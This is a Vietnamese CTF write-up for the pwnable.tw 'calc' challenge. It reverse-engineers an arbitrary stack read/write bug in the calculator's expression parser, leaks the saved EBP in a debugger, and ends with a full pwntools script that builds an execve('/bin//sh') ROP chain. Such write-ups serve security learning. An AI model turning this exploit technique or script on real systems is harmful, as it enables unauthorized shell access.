# calc

Đây là 1 bài khá là nặng về RE, và mình thì RE cực gà, nên mình sẽ làm chi tiết bài này, như tlinh xào con beat thì mình giã gạo chall này :))

```c
unsigned int calc()
{
  int v1[101]; // [esp+18h] [ebp-5A0h] BYREF
  char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
  unsigned int v3; // [esp+5ACh] [ebp-Ch]

  v3 = __readgsdword(20u);
  while ( 1 )
  {
    bzero(s, 1024u);
    if ( !get_expr((int)s, 1024) )
      break;
    init_pool(v1);
    if ( parse_expr((int)s, v1) )
    {
      printf("%d\n", v1[v1[0]]);
      fflush(stdout);
    }
  }
  return __readgsdword(20u) ^ v3;
}
```

Đầu tiên hàm bzero(s,1024) => tạo ra 1024 byte \x00 từ pointer s.

Sau đấy gọi *get_expr* để nhận input

```c
int __cdecl get_expr(int s, int max_len_1024)
{
  int v2; // eax
  char v4; // [esp+1Bh] [ebp-Dh] BYREF
  int v5; // [esp+1Ch] [ebp-Ch]

  v5 = 0;
  while ( v5 < max_len_1024 && read(0, &v4, 1) != -1 && v4 != 10 )
  {
    if ( v4 == '+' || v4 == '-' || v4 == '*' || v4 == '/' || v4 == '%' || v4 > '/' && v4 <= '9' )
    {
      v2 = v5++;
      *(_BYTE *)(s + v2) = v4;
    }
  }
  *(_BYTE *)(v5 + s) = 0;
  return v5;
}
```

Nhận vào từng byte 1 với **read(0, &v4, 1)** lưu vào v4, nếu không thuộc *+-\*/%0123456789* thì **v5 = 0** => return v5 = return 0, ra ngoài hàm main check !0 = 1 => thì tức là nhập khác các kí tự trên thì tèo.

Nhận từng kí tự và gán vào chuỗi s từ vị trí số 0, và sau cùng thêm null vào cuối chuỗi. Ví dụ nếu là nhập 1+2 thì s trông như này **"1+2\x00"**

```c
_DWORD *__cdecl init_pool(_DWORD *a1)
{
  _DWORD *result; // eax
  int i; // [esp+Ch] [ebp-4h]

  result = a1;
  *a1 = 0;
  for ( i = 0; i <= 99; ++i )
  {
    result = a1;
    a1[i + 1] = 0;
  }
  return result;
}
```

Tiếp đến là hàm init_pool, hàm này thì khởi tạo mảng v1[101] với toàn bộ đều set = 0


Tiếp đến có lẽ là hàm chính của chall này **parse_expr((int)s, v1)**

Ta sẽ phân tích từng đoạn code nhỏ 

```c
if ( (unsigned int)(*(char *)(i + input_per_row) - 48) > 9 )
```
Ở đây chính là kí tự của input - 48 > 9, mà ta đã filter trước đó thì chỉ có *+-\*/%0123456789* là pass đến đây, tuy nhiên thì với **unsigned int** và các số 0 -> 9 thì hiển nhiên trừ 48 không thể lớn hơn 9 được, cùng lắm là bằng 9 thoi (57-48 = 9). Mà nên nhớ ở đây dùng unsigned, nếu lấy 47 - 48 = -1 rồi ép kiểu unsigned thì => chỉ có các phép tính là pass qua vòng if này. Oke vậy túm lại là ở vòng if này chỉ có các phép toán là vào đây thoi.

```c
 v7 = i + input_per_row - v4;
      s1 = (char *)malloc(v7 + 1);
      memcpy(s1, v4, v7);
      s1[v7] = 0;
      if ( !strcmp(s1, "0") )
      {
        puts("prevent division by zero");
        fflush(stdout);
        return 0;
      }
```

s1 = (char *)malloc(v7 + 1);: Cấp phát bộ nhớ động cho con trỏ s1 có kích thước v7 + 1 byte.

memcpy(s1, v4, v7);: Sao chép v7 byte từ vùng bộ nhớ được chỉ định bởi pointer v4 vào vùng bộ nhớ được chỉ định bởi pointer s1.

s1[v7] = 0;: Đặt giá trị null-terminated (ký tự null '\0') vào vị trí thứ v7 của s1, biến s1 thành một chuỗi

giả dụ 1+2 thì i lúc này là 1 => v7 = 1 => s1 = 1+, s1[v7] = s1[1] = 0. Lúc này s = 1, tuy nhiên ở đây nếu s = 0 thì return để tránh việc divide by 0

sau đấy thì convert s1 từ string to int gán vào biến **num**

```c
num = atoi(s1);
if ( num > 0 )
{
v3 = (*v1)++;
v1[v3 + 1] = num;
}
```

Cụ thể thì ở đây v1 ban đầu ở point 0, xong gán cho v3, rồi mới ++1. Sau đấy v3+1 tức là gán biến num vào v1[1..] ở vị trí từ 1 trở đi, còn vị trí thứ 0 thì k bàn đến ở đây. Ví dụ 1+2 => v1[0] = 0, v1[1] = 1

```c
if ( *(_BYTE *)(i + input_per_row) && (unsigned int)(*(char *)(i + 1 + input_per_row) - 48) > 9 )
{
puts("expression error!");
fflush(stdout);
return 0;
}

```

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ ./calc
=== Welcome to SECPROG calculator ===
--
expression error!
++
expression error!
**
expression error!
/*
expression error!
```

Nó kiểu như này, hiện tại đã là 1 phép tính mà thg kế bên lại phép tính nữa thì ~error~

```c
v4 = i + 1 + input_per_row;
      if ( s[v6] )
      {
        switch ( *(_BYTE *)(i + input_per_row) )
        {
          case '%':
          case '*':
          case '/':
            if ( s[v6] != '+' && s[v6] != '-' )
              goto LABEL_14;
            s[++v6] = *(_BYTE *)(i + input_per_row);
            break;
          case '+':
          case '-':
LABEL_14:
            eval(v1, s[v6]);
            s[v6] = *(_BYTE *)(i + input_per_row);
            break;
          default:
            eval(v1, s[v6--]);
            break;
        }
      }
      else
      {
        s[v6] = *(_BYTE *)(i + input_per_row);
      }
      if ( !*(_BYTE *)(i + input_per_row) )
        break;
```

Như trên thì ta thấy thằng s được set toàn bằng 0 ở trên 

```c
char s[100]; // [esp+38h] [ebp-70h] BYREF
  unsigned int v11; // [esp+9Ch] [ebp-Ch]

  v11 = __readgsdword(0x14u);
  v4 = input_per_row;
  v6 = 0;
  bzero(s, 100u);
```
Do đó lúc này ta sẽ nhảy xuống thg **else** thì s[v6] sẽ được cập nhật chính là phép tính lúc này.

Vậy ta giả dụ s[v6] đã tồn tại và vào vòng if xem sao.


ta xem với case của phép tính hiện tại là '%', '*', '/': thì check xem là phép tính trước đó đã được lưu vào tại s[v6] có phải "++, "-" không, nếu không thì nhảy đến label_14, nếu phải thì cập nhật s[v6+1] = phép tính hiện tại. Ví dụ 1+2\*3 thì s[0] = "+" ;  s[1] = "\*"

Ta cùng đi xem label_14 có gì, label_14 này cũng thuộc các case "+" , "-", do đó nếu phép tính hiện tại là + hoặc - thì cũng vào đây

```c
eval(v1, s[v6]);
s[v6] = *(_BYTE *)(i + input_per_row);
break;
```
ta thấy ở đây có gọi đến hàm **eval** sau đấy thì cập nhật s[v6] = phép tính hiện tại.

Cùng đi vào hàm **eval** xem có gì hot:

```c
_DWORD *__cdecl eval(_DWORD *v1, char s_v6)
{
  _DWORD *result; // eax

  if ( s_v6 == '+' )
  {
    v1[*v1 - 1] += v1[*v1];
  }
  else if ( s_v6 > '+' )
  {
    if ( s_v6 == '-' )
    {
      v1[*v1 - 1] -= v1[*v1];
    }
    else if ( s_v6 == '/' )
    {
      v1[*v1 - 1] /= (int)v1[*v1];
    }
  }
  else if ( s_v6 == '*' )
  {
    v1[*v1 - 1] *= v1[*v1];
  }
  result = v1;
  --*v1;
  return result;
}
```
Đây có vẻ đơn giản chỉ là thực hiện phép tính thoi.  và kết quả được lưu vào vị trí v1[*v1-1]

giả dụ 1+2=> v1[1] =1 , v1[2]=1 => result => v1[1] = 3

kết quả cuối cùng sẽ được lưu ở v1\[v1\[0]]
Tuy nhiên khi check thì ta nhận thấy logic này bị sai:

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ ./calc
=== Welcome to SECPROG calculator ===
1+3*5/15-1
1
3*9+6+7%3
40
No time to waste!

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ python3
Python 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 3*9+6+7%3
34

```

Oke giờ đây ta đã hiểu flow của chương trình, tuy nhiên ta cần check vài thứ:

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ ./calc
=== Welcome to SECPROG calculator ===
+100
0
+10
0
+30
0
+500
0
+1000
1999514170

```

Do đó ở đây ta sẽ check thử xem flow của chương trình nếu ta nhập ***+1000*** thì như nào

Khi nhập như thế vào thì sẽ pass đoạn if đầu tiên với 
i = 0, v7 = 0, s1 được khởi tạo mảng động kích thước 1 byte

memcpy thì s1 sẽ chứa "+" và s[0] = "+"

sau đấy duyệt đến '1' và '0' thì thoát khỏi vòng for nhảy vào while ở dưới cùng 

```c
  while ( v6 >= 0 )
    eval(v1, s[v6--]);
```

Do là còn + chưa thực hiện. Lúc này vào eval thực hiện phép cộng thì hiện tại.v1[0]=1 (do v1[0] làm nhiệm vụ đếm tham số), v1[1] = 10, v1[0] = v1[0] + v1[10] = 11. Lúc thực thi eval trc khi return thì giảm v1[0] đi 1 nhầm biển hiện đã thực thi xong phép tính và giảm biến đếm tham số
nên v[0] = 11 - 1

và nên nhớ 1 điều ***kết quả cuối cùng sẽ được lưu ở v1\[v1\[0]]***
lúc này v1[0] = 10, lúc mà nó in ra kết quả thì nó in hẳn ra v1[10] như trên ta thấy v1[1000] đã bị leak ra như kia.

Thế thì giờ có thể hình dung ta có thể leak địa chỉ với ***+ num***

Và ở đây một lần nữa ta có:

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ ./calc
=== Welcome to SECPROG calculator ===
+1000
0
+500
0
+300
0
+400
-389396
+400+1
-389395
+400
-389395
```
Này dường như ta vừa thay đổi giá trị tại địa chỉ thì phải. cùng check flow chương trình xem như nào.

như này đã nhập +10 vào thì v[0]=10
giờ ta sẽ thử +10+1, thì lúc đến 10 rồi ta vẫn còn duyệt tiếp chứ không nhảy đến while, duyệt gặp dấu +, lúc vào switch case, thì nhảy vào label_14 và thực hiện với phép tính s[v6] đã lưu trước đó 

eval v1[hiện tại] = 10, v1[trước đó] = 1 => v1[i-1] = 11 chính là v1[0]=11, for sure sau đấy giảm v1[0] đi 1 đơn vị => v1[0] = 10

```c
v1[*v1 - 1] += v1[*v1];
```

```c
  --*v1;
  return result;
```



Rồi chương trình duyệt tiếp và đi vào hàm eval để tính phép tính tiếp theo, v1[0] lúc này lên **11** do là có tham số mới, v1[giá trị v1[0] -1 ] += v1[1]
nên khi đó là v1[11-1] += v1[11]

v1[11] ở đây chính là = 1, do:

```c
if ( num > 0 )
{
v3 = (*v1)++;
v1[v3 + 1] = num;
}
```
nên là lúc này nghiễm nhiên v1[10] được tăng thêm 1 đơn vị
và lúc print ra thì in cái v1\[v1[0]\] thì in cái giá trị v1[10 ra] tức là in cái  giá trị ta đã thay đổi rồi ra.

úi dồi ôi 

## OKE, sau phần re thì giờ ta sẽ tiến hành khai thác

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ checksec calc
[*] '/mnt/d/pwn_myself/pwnable_tw/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Với check file như này, có canary, nx enable, cộng với việc ta có thể leak và write tùy ý thì có lẽ không write shellcode rồi call về đấy để thực thi được tại 

> vì khi mà nx được bật thì khi load chương trình vào bộ nhớ, sẽ không cho phép 1 vùng nhớ nào đó có cả 2 quyền writeable và executable. 
>
> Vùng .text chứa code chỉ có thể execute mà không thể write, các vùng như stack, heap, data, bss chứa dữ liệu thì có thể write nhưng không thể execute. 
>
> Do đó ta không thể khai thác theo hướng chèn shellcode vào stack và cho return address trỏ về shellcode được.

Giờ ta sẽ hướng đến ROP, nãy mình check thì thấy quá tr gadget :)), nên là maybe ta có thể làm gì đó với mớ tài nguyên này.

```python

0x0805c34b : pop eax ; ret
0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
0x08049a21 : int 0x80

```

Với nhiêu đây thì ta có thể gọi execve() rồi nhợ :3

* eax = 0x0b
* ebx = address of "/bin/sh"
* ecx = edx = \x00

Vậy thì làm sao để mà thực thi được các gadget mà ta inject vào. Đó là lúc t cần previous_ebp, tức là ebp của hàm main, and why?, sau khi thực thi xong calc => quay về hàm main, lúc quay về này nó sẽ tiến hành thực hiện các gadget của chúng ta ngay sau ebp hàm main, thay vì exit(). Nai xừ.

Oke giờ ta sẽ đi leak prev_ebp

Đặt breakpoint và ta có :

```shell
pwndbg>
0x08049382 in calc ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0x0
 EBX  0x80481b0 (_init) ◂— push ebx
 ECX  0x80ed4d4 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
 EDI  0x80ec00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069120 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]
 ESI  0x0
 EBP  0xffffd218 —▸ 0xffffd238 —▸ 0x8049c30 (__libc_csu_fini) ◂— push ebx
*ESP  0xffffcc60 ◂— 0x0
*EIP  0x8049382 (calc+9) ◂— mov eax, dword ptr gs:[0x14]
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
   0x8049379 <calc>       push   ebp
   0x804937a <calc+1>     mov    ebp, esp
   0x804937c <calc+3>     sub    esp, 0x5b8
 ► 0x8049382 <calc+9>     mov    eax, dword ptr gs:[0x14]
   0x8049388 <calc+15>    mov    dword ptr [ebp - 0xc], eax
```

Lúc này ở hàm calc, ebp_calc => ebp_main. nên là ta tính được offset giữa 2 thằng là 32. thêm nữa:

```c
unsigned int calc()
{
  int v1[101]; // [esp+18h] [ebp-5A0h] BYREF
  char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
  unsigned int v3; // [esp+5ACh] [ebp-Ch]
  ....

```

Cùng nhìn lại trong hàm calc là có khai báo biến v1[] tại địa chỉ **ebp - 5A0**

Mà 5A0 = 360, tức là v1[0] có địa chỉ là = **ebp-360**, Vậy thì v1[360] = ebp_ebp. ta sẽ leak thử xem sao.

Và quả thật như vậy 

```shell
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
 ► 0x80493ed <calc+116>    call   parse_expr                     <parse_expr>
        arg[0]: 0xffffce0c ◂— '+360'
        arg[1]: 0xffffcc78 ◂— 0x0
        arg[2]: 0x0
        arg[3]: 0x0

   0x80493f2 <calc+121>    test   eax, eax
   0x80493f4 <calc+123>    je     calc+175                     <calc+175>

   0x80493f6 <calc+125>    mov    eax, dword ptr [ebp - 0x5a0]
   0x80493fc <calc+131>    sub    eax, 1
   0x80493ff <calc+134>    mov    eax, dword ptr [ebp + eax*4 - 0x59c]
   0x8049406 <calc+141>    mov    dword ptr [esp + 4], eax
   0x804940a <calc+145>    mov    dword ptr [esp], 0x80bf804
   0x8049411 <calc+152>    call   printf                     <printf>

   0x8049416 <calc+157>    mov    eax, dword ptr [stdout]       <0x80ec4c0>
   0x804941b <calc+162>    mov    dword ptr [esp], eax
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcc60 —▸ 0xffffce0c ◂— '+360'
01:0004│     0xffffcc64 —▸ 0xffffcc78 ◂— 0x0
02:0008│     0xffffcc68 ◂— 0x0
... ↓        5 skipped
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x80493ed calc+116
   1 0x8049499 main+71
   2 0x804967a __libc_start_main+458
   3 0x8048d4b _start+33
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
-11720

```

Đổi --11720 => hex = 0xffffd238 = ebp_main

Mình show stack cho dễ hình dung chỗ này, thế quái nào mình cần gần 2 tiếng ở đây...

| return address |   
|----------------|
|  ebp main func |  
|       ...      |
|       ...      |
|      v1[1]     |
|      v1[0]     |

  ebp main func   **<- ebp calc func <- v1[360]**

**0x5A0 = 1440 = 360\*4, với mảng kiểu int kiến trúc x86 => mỗi stack ứng với 4bytes => offset = 360**


Đây chính là lý do mà v[360] => giá trị ebp main = prev_ebp

Return address ngay trên prev_ebp => offset là 361, do đó từ offset 361 trở đi ta sẽ tiến hành ghi các gadgets.

Cụ thể ta sẽ set up stack như sau 

|  offset |       inject          |
|---------|-----------------------|
|   778   |       "//sh"          |
|   777   |       "/bin"          |
|   ...   |        ...            |
|   ...   |        ...            |
|   367   |      int 0x80         |
|   366   | address of "/bin//sh" |
|   365   |       0x00            |
|   364   |       0x00            |
|   363   |  pop_edx_ecx_ebx_ret  |
|   362   |       0x0b            |
|   361   |    pop_eax_ret        |
|   360   |      prev_ebp         |


### Exploit

```python
from pwn import *

sh = 0x68732f2f
bin = 0x6e69622f

offset_ebp = 32

def toInt(s):
    s = s.strip()
    if not s.startswith(b'-'):
        return int(s)
    else:
        return (int(s[1:]) ^ 0xffffffff) + 1

def toStr(ori, new):
    if hex(new).startswith('0xf'):
        new = int('-' + str((new ^ 0xffffffff) + 1))
    if new > ori:
        return '+' + str(new - ori)
    elif new < ori:
        return '-' + str(ori - new)
    else:
        return ''

s = process('./calc')
#s = remote('chall.pwnable.tw', 10100)
#gdb.attach(s, api=True)
print(s.recvuntil('\n'))

s.sendline('+777')
s.sendline('+777' + toStr(toInt(s.recvuntil('\n')), bin))
print(s.recvuntil('\n'))

s.sendline('+778')
s.sendline('+778' + toStr(toInt(s.recvuntil('\n')), sh))
print(s.recvuntil('\n'))

s.sendline('+360')
prev_ebp = s.recvuntil('\n')
prev_ebp = toInt(prev_ebp)

ebp = prev_ebp - offset_ebp
print('ebp calc:', hex(ebp))

rop_gadgets = [
    (0x0805c34b, 'pop eax'),
    (0xb, 'value for eax (0xb)'),
    (0x080701d0, 'pop edx ecx ebx'),
    (0, 'value for edx (0)'),
    (0, 'value for ecx (0)'),
    (ebp + (777 - 360) * 4, 'address of "/bin//sh"'), 
    (0x08049a21, 'int 0x80')
]
for line_num, (addr, desc) in enumerate(rop_gadgets, start=361):
    s.sendline(f'+{line_num}')
    s.sendline(f'+{line_num}' + toStr(toInt(s.recvuntil('\n')), addr))
    print(s.recvuntil('\n'))


s.interactive()

```